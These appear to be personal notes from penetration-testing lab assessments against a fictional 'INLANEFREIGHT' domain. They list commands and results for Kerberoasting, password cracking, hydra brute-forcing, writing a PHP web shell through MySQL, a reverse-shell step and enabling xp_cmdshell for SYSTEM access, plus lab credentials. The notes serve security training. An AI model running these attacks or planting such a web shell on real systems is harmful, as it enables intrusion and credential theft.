# Skill Assessments

TODOS:
- Footprinting
- Pivoting, Tunneling, and Port Forwarding
- AD
- AD Bloodhound

*Command*: 

*Result:* 

## Crackmapexec
*Command*: Find all internal ips and domain names
- proxychains4 -q cme smb -M ioxidresolver

*Result*:
|       IP       |        Domain Name        | Notes |
| :------------: | :-----------------------: | :---: |
|  172.16.15.3   | dc01.INLANEFREIGHT.LOCAL  |       |
|  172.16.15.15  | ql01.INLANEFREIGHT.LOCAL  |       |
|  172.16.15.20  | dev01.INLANEFREIGHT.LOCAL |       |
| 10.129.246.181 | sql01.INLANEFREIGHT.LOCAL |       |

---

*Command*: RIDs bruteforce
- proxychains4 -q cme smb --rid-brute 10000

*Result:* Juliette

---

*Command*: Kerberosasting anonymous
- proxychains4 cme ldap --kerberoasting kerberoasting.out

*Result:* 
- Juliette:hash

---

*Command*: Crack Juliettes password
- hashcat -m 18200 hash.juliette

*Result:* juliettes:Password1

---

*Command*: User discovery with juliettes user
- cmd ldap -M user-desc

*Result:* Atul:hooters1

---

*Command*: Execution ov xp_dirtree inside mssql
- Responder
- cme mssql - xp_dirtree
  
*Result:* SQL01$::INLANEFREIGHT:hash

---

### Credentials Found
|   Username    | Password  |   Note   |
| :-----------: | :-------: | :------: |
|   Juliette    | Password1 | 1st flag |
|     Atul      | hooters1  | kerbast  |
|     james     |   None    |          |
| svc_inlaneadm |   None    |          |
|  svc_devadm$  |   None    |          |

## Common Services
### Assessment 1
*Command:* smtp-user-enum -M RCPT -U users.list -t $TARGET -D inlanefreight.htb -p 587

*Result*: 10.129.95.172: **fiona@inlanefreight.htb** exists

---

*Command:* hydra -l 'fiona@inlanefreight.htb' -P /usr/share/wordlists/rockyou.txt -f $TARGET smtp -v -I

*Result*: login: fiona@inlanefreight.htb   password: 987654321
fiona:987654321

---

*Command:* 
1. mysql -h $TARGET -u fiona -p'987654321'
2. select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php';
3. http://10.129.203.7/back.php?c=whoami
4. Start listener
5. http://10.129.203.7/back.php?c=powershell [enconded shell from here](https://www.revshells.com/)

### Assessment 2
*Command:* ./subbrute.py inlanefreight.htb -s names.txt -r resolvers.txt
*Result*: app.inlanefreight.htb

---

*Command:* dig AXFR @app.inlanefreight.htb inlanefreight.htb
*Result*: 

|           Domain           |   IP Address   |
| :------------------------: | :------------: |
|   app.inlanefreight.htb.   |  10.129.200.5  |
|   dc1.inlanefreight.htb.   | 10.129.100.10  |
|   dc2.inlanefreight.htb.   | 10.129.200.10  |
| int-ftp.inlanefreight.htb. |   127.0.0.1    |
| int-nfs.inlanefreight.htb. | 10.129.200.70  |
|   ns.inlanefreight.htb.    |   127.0.0.1    |
|   un.inlanefreight.htb.    | 10.129.200.142 |
|   ws1.inlanefreight.htb.   | 10.129.200.101 |
|   ws2.inlanefreight.htb.   | 10.129.200.102 |
|  wsus.inlanefreight.htb.   | 10.129.200.80  |

---

*Command:*
nmap -p-
**rustscan -a 10.129.38.94 -r 1-65535**

*Result:*

|     PORT      |  STATE   |   SERVICE   |
| :-----------: | :------: | :---------: |
|    22/tcp     |   open   |     ssh     |
|    53/tcp     |   open   |   domain    |
|    110/tcp    |   open   |    pop3     |
|    995/tcp    |   open   |    pop3s    |
|   2121/tcp    |   open   | ccproxy-ftp |
| **30021/tcp** | **open** | **unknown** |

---

*Command:* ftp $TARGET 30021

*Result:* get simon/mynotes.txt => wordlist, maybe passwords

---

*Command:* 
hydra -l simon -P mynotes.txt 10.129.38.94 ssh -v -I
   
*Result*: simon:8Ns8j1b!23hs4921smHzwn

### Assessment 3
*Command:* rustscan -a 10.129.203.10 -r 1-65535

*Result:* 135,445

---

*Command:* smb -L //TARGET/home

*Result:*  simon:random.txt

---

*Command:* crackmapexec smb 10.129.203.10 -u assusers.txt -p asspass.txt

*Result:* fiona:48Ns72!bns74@S84NNNSl

---

*Command:* hydra -L assuser.txt -P asspass.txt 10.129.203.10 rdp -v -I

*Result:* login: fiona   password: 48Ns72!bns74@S84NNNSl

---

*Command:* rdesktop 10.129.203.10 -u fiona -p '48Ns72!bns74@S84NNNSl'

*Result:* Conect to RDP

---

*Command:* Check who can I impersonate
1. SELECT distinct b.name
2. FROM sys.server_permissions a
3. INNER JOIN sys.server_principals b
4. ON a.grantor_principal_id = b.principal_id
5. WHERE a.permission_name = 'IMPERSONATE'
6. GO

*Result:*  John

---

*Command:* Impersonate JOHN
1. EXECUTE AS LOGIN = 'john'
2. SELECT SYSTEM_USER
3. SELECT IS_SRVROLEMEMBER('sysadmin')
4. GO

*Result:* Now I am John

---

*Command:* Identify linked servers: SELECT srvname, isremote FROM sysservers 

*Result:* LOCAL.TEST.LINKED.SRV

---

*Command:* conected to linked server: EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]

*Result:* testadmin

---

*Command:* Enable xp_cmdshell
1. EXECUTE("EXECUTE sp_configure 'show advanced options', 1") AT [LOCAL.TEST.LINKED.SRV]
2. EXECUTE("RECONFIGURE") AT [LOCAL.TEST.LINKED.SRV]
3. EXECUTE("EXECUTE sp_configure 'xp_cmdshell', 1") AT [LOCAL.TEST.LINKED.SRV]
4. EXECUTE("xp_cmdshell 'whoami'") AT [LOCAL.TEST.LINKED.SRV]

*Result:* nt authority\system

---

*Command:* Read admin flag
1. EXECUTE("xp_cmdshell 'dir C:\Users\Administrator\Desktop'") AT [LOCAL.TEST.LINKED.SRV]
2. EXECUTE("xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt'") AT [LOCAL.TEST.LINKED.SRV]

*Result:* Flag